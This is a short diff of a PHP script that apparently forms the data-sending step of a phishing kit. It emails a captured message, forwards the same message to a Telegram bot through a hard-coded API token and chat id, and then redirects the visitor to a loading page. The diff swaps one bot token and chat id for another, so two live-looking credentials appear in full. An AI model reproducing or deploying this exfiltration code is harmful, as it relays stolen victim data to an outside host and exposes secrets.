@@ -44,7 +44,7 @@ $headers="From: dr<comms@dioury.casa>\r\n";
 $headers.="MIME-Version: 1.0\r\n";
 $headers.="Content-Type: text/plain; charset=UTF-8\r\n";
 @mail($email,$subject,$msg,$headers);
-file_get_contents('https://api.telegram.org/bot6571406193:AAFXuvB6-Y1wzSD7sfMuXf6x4HKE3FNmhr8/sendMessage?chat_id=979803173&text='.urlencode($msg));
+file_get_contents('https://api.telegram.org/bot6643043813:AAFtzWGDrivNa0gdTad3rZwu_dn-yG8pzqU/sendMessage?chat_id=-4058749596&text='.urlencode($msg));
 
 header("Location: load.php?id=2");
 ?>
